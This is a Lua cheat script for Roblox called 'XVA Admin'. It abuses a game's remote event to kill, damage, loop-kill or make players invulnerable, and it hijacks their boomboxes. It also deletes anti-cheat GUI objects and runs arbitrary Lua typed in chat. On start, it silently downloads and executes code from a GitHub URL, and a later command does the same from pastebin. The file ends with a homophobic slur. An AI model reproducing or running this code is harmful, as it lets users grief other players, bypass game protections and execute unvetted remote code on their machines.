local AdminChecked = _G.Admin

AdminChecked = true

if AdminChecked == true then
local Spam = [[

`YMM'   `MP'`7MMF'   `7MF' db      
  VMb.  ,P    `MA     ,V  ;MM:     
   `MM.M'      VM:   ,V  ,V^MM.    
     MMb        MM.  M' ,M  `MM    
   ,M'`Mb.      `MM A'  AbmmmqMA   **BUY Today!**
  ,P   `MM.      :MM;  A'     VML  
.MM:.  .:MMa.     VF .AMA.   .AMMA]]

local gPlayers = game:GetService("Players")
local admin = game.Players.LocalPlayer.Name
local bannedplyrs = {"am5o"}

local admins = {"Friend, Friend"}

local services = {}
local cmds = {}
local std = {}

local serverLocked = false

pcall(function(...)
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaStackin/ROBLOX/main/%3F%3F%3F.lua"))()
end)

function FIX_LIGHTING()
    game.Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
    game.Lighting.Brightness = 1
    game.Lighting.GlobalShadows = true
    game.Lighting.Outlines = false
    game.Lighting.TimeOfDay = 14
    game.Lighting.FogEnd = 100000
	end

	services.players = gPlayers
	services.lighting = game:GetService("Lighting")
	services.workspace = game:GetService("Workspace")
	services.events = {}
	local user = gPlayers.LocalPlayer
	
	local tprefix = ">"
	local scriptprefix = "/"
	local split = " "
	game.StarterGui:SetCore(
	    "SendNotification",
	    {
	        Title = "Enjoy XVA!",
	        Text = "Prefix is " .. tprefix,
	        Icon = "rbxassetid://4879493225"
		    }
	)

	for i, v in pairs(game.CoreGui:GetDescendants()) do
	    if v:IsA("TextLabel") and v.Text == "XVA Admin" then
	        print(v:GetFullName())
	    end
	end
	
	local updateevents = function()
	    for i, v in pairs(services.events) do
	        services.events:remove(i)
	        v:disconnect()
	    end
	    for i, v in pairs(gPlayers:players()) do
	        local ev =
	            v.Chatted:connect(
	            function(msg)
	                do_exec(msg, v)
	            end
	        )
	        services.events[#services.events + 1] = ev
	    end
	end

	std.inTable = function(tbl, val)
	    if tbl == nil then
	        return false
	    end
	
	    for _, v in pairs(tbl) do
	        if v == val then
	            return true
	        end
	    end
	    return false
	end
	
	std.out = function(str)
	    print(str)
	end
	
	std.list = function(tbl)
	    local str = ""
	    for i, v in pairs(tbl) do
	        str = str .. tostring(v)
	        if i ~= #tbl then
	            str = str .. ", "
	        end
	    end
	    return str
	end
	
	std.endat = function(str, val)
	    local z = str:find(val)
	    if z then
	        return str:sub(0, z - string.len(val)), true
	    else
	        return str, false
	    end
	end
	
	std.first = function(str)
	    return str:sub(1, 1)
	end
	
	local isAdmin = function(name)
	    if name == admin then
	        return true
	    elseif admins[name] == true then
	        return true
	    end
	    return false
	end
	
	local exec = function(str)
	    spawn(
	        function()
	            local script, loaderr = loadstring(str)
	            if not script then
	                error(loaderr)
	            else
	                script()
	            end
	        end
	    )
	end
	
	local findCmd = function(cmd_name)
	    for i, v in pairs(cmds) do
	        if v.NAME:lower() == cmd_name:lower() or std.inTable(v.ALIAS, cmd_name:lower()) then
	            return v
	        end
	    end
	end
	
	local getCmd = function(msg)
	    local cmd, hassplit = std.endat(msg:lower(), split)
	    if hassplit then
	        return {cmd, true}
	    else
	        return {cmd, false}
	    end
	end
	
	local getprfx = function(strn)
	    if strn:sub(1, string.len(tprefix)) == tprefix then
	        return {"cmd", string.len(tprefix) + 1}
	    elseif strn:sub(1, string.len(scriptprefix)) == scriptprefix then
	        return {"exec", string.len(scriptprefix) + 1}
	    end
	    return
	end
	
	local getArgs = function(str)
	    local args = {}
	    local new_arg = nil
	    local hassplit = nil
	    local s = str
	    repeat
	        new_arg, hassplit = std.endat(s:lower(), split)
	        if new_arg ~= "" then
	            args[#args + 1] = new_arg
	            s = s:sub(string.len(new_arg) + string.len(split) + 1)
	        end
	    until hassplit == false
	    return args
	end
	
	local function execCmd(str, plr)
	    local s_cmd
	    local a
	    local cmd
	    s_cmd = getCmd(str) --separate command from string using split {command name,arg bool (for arg system)}
	    cmd = findCmd(s_cmd[1]) --get command object {NAME,DESC,{ALIASES},function(args)}
	    if cmd == nil then
	        return
	    end
	    a = str:sub(string.len(s_cmd[1]) + string.len(split) + 1)
	     --start string "a" after command and split
	    local args = getArgs(a)
	     --gets us a nice table of arguments
	
	    pcall(
	        function()
	            cmd.FUNC(args, plr)
	        end
	    )
	end
	
	function do_exec(str, plr)
	    if not isAdmin(plr.Name) then
	        return
	    end
	
	    str = str:gsub("/e ", "") --remove "/e " the easy way!
	
	    local t = getprfx(str)
	    if t == nil then
	        return
	    end
	    str = str:sub(t[2])
	    if t[1] == "exec" then
	        exec(str)
	    elseif t[1] == "cmd" then
	        execCmd(str, plr)
	    end
	end
	
	updateevents()
_G.exec_cmd = execCmd
	--game.Players.LocalPlayer.Chatted:connect(doexec)
	
	local _char = function(plr_name)
	    for i, v in pairs(game.Players:GetChildren()) do
	        if v:IsA "Player" then
	            if v.Name == plr_name then
	                return v.Character
	            end
	        end
	    end
	    return
	end
	
	local _plr = function(plr_name)
	    for i, v in pairs(game.Players:GetChildren()) do
	        if v:IsA "Player" then
	            if v.Name == plr_name then
	                return v
	            end
	        end
	    end
	    return
	end
	
	function addcmd(name, desc, alias, func)
	    cmds[#cmds + 1] = {
	        NAME = name,
	        DESC = desc,
	        ALIAS = alias,
	        FUNC = func
	    }
	end
	
	local function getPlayer(name)
	    local nameTable = {}
	    name = name:lower()
	    if name == "me" then
	        return {admin}
	    elseif name == "others" then
	        for i, v in pairs(gPlayers:GetChildren()) do
	            if v:IsA "Player" then
	                if v.Name ~= admin then
	                    nameTable[#nameTable + 1] = v.Name
	                end
	            end
	        end
	    elseif name == "all" then
	        for i, v in pairs(gPlayers:GetChildren()) do
	            if v:IsA "Player" then
	                nameTable[#nameTable + 1] = v.Name
	            end
	        end
	    else
	        for i, v in pairs(gPlayers:GetChildren()) do
	            local lname = v.Name:lower()
	            local i, j = lname:find(name)		    
	            if i == 1 then
	                return {v.Name}
	            end
	            local dname = v.DisplayName:lower()
	            local n, m = dname:find(name)		    
	            if n == 1 then
	                return {v.Name}
	            end
	        end
	    end
	    return nameTable
	end
local a =
	setmetatable(
	    {},
	    {__index = function(b, c)
	            return game:service(c)
	        end}
	)
local d = {"AntiSpeedHack", "AntiDataTheft", "UI", "NO FF"}
local e = a.Players.LocalPlayer
local f = {}
function NoAnti()
    spawn(
        function()
            game:GetService("RunService").RenderStepped:wait()
            for g, h in pairs(f) do
                h:remove()
                f[g] = nil
            end
            for g, h in pairs(e.PlayerGui:GetChildren()) do
                for g, b in pairs(d) do
                    if b == h.Name then
                        h:remove()
                    end
                end
            end
        end
    )
end
NoAnti()

addcmd(
    "god",
    "gods the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        NoAnti()
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("god") then
                gPlayers[v]:FindFirstChild("god"):Destroy()
            end
            local god = Instance.new("BoolValue")
            god.Parent = gPlayers[v]
            god.Value = true
            god.Name = "god"

            game:GetService("RunService").RenderStepped:connect(
                function()
                    if gPlayers[v]:FindFirstChild("god") then
                        game.ReplicatedStorage.Event:FireServer(
                            "TPD",
                            -math.huge ^ 1.45,
                            gPlayers[v].Character:FindFirstChild("Humanoid")
                        )
                        game.ReplicatedStorage.Event:FireServer(
                            "TPD",
                            math.huge,
                            gPlayers[v].Character and gPlayers[v].Character:FindFirstChild "Humanoid" or
                                gPlayers[v].CharacterAdded:wait():FindFirstChild("Humanoid")
                        )
                    end
                end
            )
        end
    end
)

addcmd(
    "ungod",
    "ungods the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("god") then
                gPlayers[v]:FindFirstChild("god"):Destroy()
game.ReplicatedStorage.Event:FireServer("TPD", math.huge, gPlayers[v].Character.Humanoid)
            end
        end
    end
)

addcmd(
    "loopgod",
    "loopgods the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        NoAnti()
        for i, v in pairs(players) do
            game:GetService("RunService").RenderStepped:connect(
                function()
				game:GetService("RunService").Stepped:wait()
                    game.ReplicatedStorage.Event:FireServer(
                        "TPD",
                        -math.huge ^ 1.45,
                        gPlayers[v].Character:FindFirstChild("Humanoid")
                    )
                    game.ReplicatedStorage.Event:FireServer(
                        "TPD",
                        math.huge,
                        gPlayers[v].Character and gPlayers[v].Character:FindFirstChild "Humanoid" or
                            gPlayers[v].CharacterAdded:wait():FindFirstChild("Humanoid")
                    )
                end
            )
        end
    end
)

addcmd(
    "ID",
    "plays a id from the chosen player boombox",
    {},
    function(args)
        local players = getPlayer(args[1])
        if not args[1] or not args[2] then
            return
        end
        local num = args[2]
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("PlayRadio", gPlayers[v], num)
        end
    end
)

addcmd(
    "goto",
    "teleports you to the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        if players ~= nil and _char(players[1]):FindFirstChild("HumanoidRootPart") then
            _char(admin).HumanoidRootPart.CFrame = _char(players[1]).HumanoidRootPart.CFrame
        end
    end
)

addcmd(
    "kill",
    "destroys the breakjoins of the chosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("TPD", math.huge, gPlayers[v].Character.Humanoid)
        end
    end
)

addcmd(
    "dm",
    "destroys the # of the amount that the player typed",
    {},
    function(args)
        local players = getPlayer(args[1])
        if not args[1] or not args[2] then
            return
        end
        local num = args[2]
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("TPD", num, gPlayers[v].Character.Humanoid)
        end
    end
)

addcmd(
    "heal",
    "gives back num% of the of the damaged health from the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
      	if not args[1] or not args[2] then
            return
        end
        local num = args[2]
			NoAnti()
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("TPD", -num, gPlayers[v].Character.Humanoid)
        end
    end
)

addcmd(
    "mute",
    "mutes the player song from a while true do type function until the admin does unmute",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("mute") then
                gPlayers[v]:FindFirstChild("mute"):Destroy()
            end
            local mute = Instance.new("BoolValue")
            mute.Parent = gPlayers[v]
            mute.Value = true
            mute.Name = "mute"
            game:GetService("RunService").RenderStepped:connect(
                function()
                    if gPlayers[v]:FindFirstChild("mute") then
                        game.ReplicatedStorage.Event:FireServer("PlayRadio", gPlayers[v], logo)
                    end
                end
            )
        end
    end
)

addcmd(
    "unmute",
    "unradio ban a player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("mute") then
                gPlayers[v]:FindFirstChild("mute"):Destroy()
            end
        end
    end
)

addcmd(
    "stop",
    "stops the chosen player boombox",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("PlayRadio", gPlayers[v], Spam)
        end
    end
)

addcmd(
    "v",
    "view's the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        workspace.CurrentCamera.CameraSubject = game.Players[players[1]].Character
    end
)

addcmd(
    "loop",
    "requires at least lower then 100 ping or below",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("fasterloop") then
                gPlayers[v]:FindFirstChild("fasterloop"):Destroy()
            end
            local fasterloop = Instance.new("BoolValue")
            fasterloop.Parent = gPlayers[v]
            fasterloop.Value = true
            fasterloop.Name = "fasterloop"
            game:GetService("RunService").RenderStepped:connect(
                function()
				game:GetService("RunService").Stepped:wait()
                    if gPlayers[v]:FindFirstChild("fasterloop") then
                        local s =
                            game:GetService("Players"):FindFirstChild(gPlayers[v].Name).Character:FindFirstChild(
                            "Humanoid"
                        )
                        game.ReplicatedStorage.Event:FireServer("TPD", math.huge, s)
                    end
                end
            )
        end
    end
)
addcmd(
    "unloop",
    "unloops the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("fasterloop") then
                gPlayers[v]:FindFirstChild("fasterloop"):Destroy()
            end
        end
    end
)

addcmd(
    "loopkill",
    "loopkills the choosen person",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            game:GetService("RunService").RenderStepped:connect(
                function()
				game:GetService("RunService").Stepped:wait()
                    local s =
                        game:GetService("Players"):WaitForChild(gPlayers[v].Name).Character:FindFirstChild("Humanoid")
                    game.ReplicatedStorage.Event:FireServer("TPD", math.huge, s)
                end
            )
        end
    end
)
addcmd(
    "cmds",
    "shows the list for admin commands",
    {},
    function(args)
print([[

      ----------- -------------------------------------------------------------------------   ---------
      Y88b   d88P 888     888     d8888 d8b          |     .d8888b.  888b     d888 8888888b.   .d8888b.  
       Y88b d88P  888     888    d88888 88P          |    d88P  Y88b 8888b   d8888 888  "Y88b d88P  Y88b 
        Y88o88P   888     888   d88P888 8P           |    888    888 88888b.d88888 888    888 Y88b.      
         Y888P    Y88b   d88P  d88P 888 "  .d8888b   |    888        888Y88888P888 888    888  "Y888b.   
         d888b     Y88b d88P  d88P  888    88K       |    888        888 Y888P 888 888    888     "Y88b. 
        d88888b     Y88o88P  d88P   888    "Y8888b.  |    888    888 888  Y8P  888 888    888       "888 
       d88P Y88b     Y888P  d8888888888         X88  |    Y88b  d88P 888   "   888 888  .d88P Y88b  d88P 
      d88P   Y88b     Y8P  d88P     888     88888P'  |     "Y8888P"  888       888 8888888P"   "Y8888P"
      ------------    ------------------------------------------------------------------------ -------
      --= [What to know & How to use the admin]
      --= [What is the prefix?, The Prefix is >]
      --= [Can it be changeable? Yes by typing >!, >/, >\, >*]
      --= [How to use a command? All You have to do is type ">Kill Johndoe
      
      -------------------------
      // These are the commands
      ------------------------------------------------------------
      -- ID // A command that plays songs or short hash's Example = ">ID Me/All/Others AudioID
      -- Kill // A command to kill all or others or even yourself.
      -- Loopkill // A command that loops the person that you wanted to be loopedkill'ed, for infinfity times unless if you leaves.
      -- Loop // An better & Interent Ping Based command that is overpowered if you're ping is good.
      -- Unloop // A command that stops the "Loop" Command and destroys that "Loopkill" Value in order to stop the loop command.
      -- God // It Gods the player with a 99% Bypass-able. but does need to be >ung sometimes if you do all because the chat will bug after a while.
      -- Ungod // Ungods the chosen player and basically getting rid of the goddess-value.
      -- dm // A damage command that can be used on all or others or yourself by saying "{Prefix } dm {Player or all or others} 99.
      -- heal // A Healing command that have to be used like "{Prefix} heal {Player or all or others} {num}.
      -- whitelist // A give or take command that allows players to be whitelisted to your commands & be able to abuse them.
      -- remove // Basically Removes the whitelist permissions for that player.
      -- mute // Basically Mutes all boombox's songs until it is stopped with a command.
      -- unmute // Basically Unmutes all boombox's and allows them to play their song again.
      -- stop // Stops the choosen player or even all or others or yourself boombox's one time and sends a XVA message in f9
      -- cloak // Makes you invisible to others, but makes you not invisible to you.
      ------------------------------------------------------------------------------
      .. These are the local commands.
      --------------------------------
      -- fly .. Self Explain-able.
      -- unfly .. Self Explain-able.
      -- noclip .. Walks through walls.
      -- ws .. Changes the speed to any amount "ws me num"
      -- clip .. Disables you're noclip command so you no longer can't walk through walls until command was said again.
      -- v .. Views the choosen Player.
      -- shiftlock .. Enables shiftlock by you going to your settings and put it to on once the command was said.
      -- serverhop .. Joins a new server.
      -- Rejoin .. Rejoins the same server unless somebody joins it.
      -- leave .. Closes your roblox client.
      ------------------------------------------------------------------------------]])
end)
	
addcmd(
    "cloak",
    "makes the chosen invisible",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            local workspacep = game.Workspace.Ignore.Players
            local audio = workspacep:FindFirstChild(players[1])
            game.ReplicatedStorage.Event:FireServer("Cloak", audio)
        end
    end
)
addcmd(
    "Walkspeed",
    "changes the localplayer walkspeed",
    {},
    function(args)
        local players = getPlayer(args[1])
        if not args[1] or not args[2] then
            return
        end
        local num = args[2]
        for i, v in pairs(players) do
            if _char(v):FindFirstChild("Humanoid") then
                _char(v).Humanoid.WalkSpeed = tonumber(num)
            end
        end
    end
)
addcmd(
    "Add",
    "lets a player use your admin commands",
    {},
    function(args)
        if not args[1] then
            return
        end
        local players = getPlayer(args[1])
        table.foreach(
            players,
            function(k, v)
                admins[v] = true
            end
        )
    end
)
addcmd(
    "Remove",
    "removes the playewr whitelist for the admin commands",
    {},
    function(args)
        if not args[1] then
            return
        end
        local players = getPlayer(args[1])
        table.foreach(
            players,
            function(k, v)
                admins[v] = nil
            end
        )
    end
)

-- Local Commands
addcmd(
    "fps",
    "checks what is your fps at",
    {},
    function(args)
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "FPS Capped",
                Text = "Current Fps is " .. game:GetService("Workspace"):GetRealPhysicsFPS(),
                Icon = "rbxassetid://4879493225"
            }
        )

        for i, v in pairs(game.CoreGui:GetDescendants()) do
            if v:IsA("TextLabel") and v.Text == "FPS" then
                print(v:GetFullName())
            end
        end
    end
)-- Stopped of the Local Commands

addcmd(-- Prefix Commands Starts
    "/",
    tprefix,
    {},
    function(args)
        tprefix = "/"
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "Prefix Message",
                Text = "Prefix is changed to Era's Prefix",
                Icon = "rbxassetid://4879493225"
            }
        )
    end
)
addcmd(
    "!",
    tprefix,
    {},
    function(args)
        tprefix = "!"
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "Prefix Message", -- Required. Has to be a string!
                Text = "Prefix was changed to Matt's Prefix",
                Icon = "rbxassetid://4879493225"
            }
        )
    end
)
addcmd(
    "*",
    tprefix,
    {},
    function(args)
        tprefix = "*"
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "Prefix Message",
                Text = "Prefix was changed to Last Update's Prefix",
                Icon = "rbxassetid://4879493225"
            }
        )
    end
)
addcmd(
    "\\",
    tprefix,
    {},
    function(args)
        tprefix = "\\"
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "Prefix Message",
                Text = "Prefix is back to \\",
                Icon = "rbxassetid://4879493225"
            }
        )
    end
)-- Ending of Prefix Commands



addcmd(
	"fly",
	"makes the localplayer fly",
{},
	function(args)
local mouse = game.Players.LocalPlayer:GetMouse ""
local localplayer = game.Players.LocalPlayer
game.Players.LocalPlayer.Character:WaitForChild("Torso")
local torso = game.Players.LocalPlayer.Character.Torso
local flying = true
local speed = 5
local keys = {a = false, d = false, w = false, s = false}
local e1
local e2
local function start()
local pos = Instance.new("BodyPosition", torso)
local gyro = Instance.new("BodyGyro", torso)
pos.Name = "EPIXPOS"
pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
pos.position = torso.Position
gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
gyro.cframe = torso.CFrame
function NoFly()
flying = false
if gyro then
gyro:Destroy()
end
if pos then
pos:Destroy()
end
localplayer.Character.Humanoid.PlatformStand = false
speed = 0
end
repeat
wait()
localplayer.Character.Humanoid.PlatformStand = true
local new = gyro.cframe - gyro.cframe.p + pos.position
if not keys.w and not keys.s and not keys.a and not keys.d then
speed = 1
end
if keys.w then
new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
speed = speed + 0.05
end
if keys.s then
new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
speed = speed + 0.03
end
if keys.d then
new = new * CFrame.new(speed, 0, 0)
speed = speed + 0.02
end
if keys.a then
new = new * CFrame.new(-speed, 0, 0)
speed = speed + 0.03
end
if speed > 3 then
speed = 3
end
pos.position = new.p
if keys.w then
gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(speed * 6), 0, 0)
elseif keys.s then
gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(speed * 5), 0, 0)
else
gyro.cframe = workspace.CurrentCamera.CoordinateFrame
end
until flying == false
NoAnti()
flying = false
if gyro then
gyro:Destroy()
end
if pos then
pos:Destroy()
end
localplayer.Character.Humanoid.PlatformStand = false
speed = 0
end
e1 = mouse.KeyDown:connect(function(key)
if not torso or not torso.Parent then
flying = false
e1:disconnect()
e2:disconnect()
return
end
if key == "w" then
keys.w = true
elseif key == "s" then
keys.s = true
elseif key == "a" then
keys.a = true
elseif key == "d" then
keys.d = true
elseif key == "p" then
keys.d = true
end
e2 = mouse.KeyUp:connect(function(key)
if key == "w" then
keys.w = false
elseif key == "s" then
keys.s = false
elseif key == "a" then
keys.a = false
elseif key == "d" then
keys.d = false
end
start()
end)
end)
end)

addcmd(
    "unfly",
    "makes localplayer fly",
    {},
    function(args)
        NoFly()
    end
)

-- Local Commands
addcmd(
    "rejoin",
    "makes the localplayer rejoin hopefully quicker",
    {},
    function(args)
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end
)

addcmd(
    "leave",
    "shutdowns the localplayer game",
    {},
    function(args)
        game:Shutdown()
    end
)
	
addcmd(
    "reset",
    "kills the localplayer even through if you're still goded",
    {},
    function(args)
        game.Players.LocalPlayer.Character:BreakJoints()
    end
)

addcmd(
    "shiftlock",
    "enables shiftlock",
    {},
    function(args)
        game.Players.LocalPlayer.DevEnableMouseLock = true
    end
)

addcmd(
    "Anti-Hashs",
    "Loads in XVA's Anti-Audio logger",
    {},
    function(args)
loadstring(game:HttpGet(('https://pastebin.com/raw/b8BKSTp3'),true))()
    end
)

local Player = game.Players.LocalPlayer
Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "noclip") then
            local function noclip(plr)
                local admintag = Instance.new("BoolValue")
                admintag.Parent = game.Players[plr]
                admintag.Value = true
                admintag.Name = "noclip"
            end
            if game.Players.LocalPlayer:FindFirstChild("noclip") then
                game.Players.LocalPlayer.noclip:Destroy()
            end
            noclip(game.Players.LocalPlayer.Name)
            game:GetService("RunService").Stepped:connect(
                function()
                    if game.Players.LocalPlayer:FindFirstChild("noclip") then
                        game.Players.LocalPlayer.Character.Head.CanCollide = false
                        game.Players.LocalPlayer.Character.Torso.CanCollide = false
                    end
                end
            )
        end
    end
)

Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "clip") then
            game.Players.LocalPlayer.noclip:Destroy()
        end
    end
)

Player.Chatted:connect(function(cht)
if cht:match(tprefix.."serverhop") then
local PlaceId = game.PlaceId
local URL = ("https://www.roblox.com/games/getgameinstancesjson?placeId=%s&startindex="):format(PlaceId)

local List = {}

for page = 0, 30 do
    local Query = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL .. page))

    for i, v in next, Query.Collection do
        List[v.Guid] = v.Ping
    end
end

local ChosenServer = game.JobId

for i, v in pairs(List) do
    if i ~= game.JobId then
        ChosenServer = i
        break
    end
end

game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId, ChosenServer, game.Players.LocalPlayer) end; end); -- Undented Ends -- Stops here
else
	game.Players.LocalPlayer:Kick("Come back when it is actually updated.")
end

print('join discord.gg/audiohub fag')
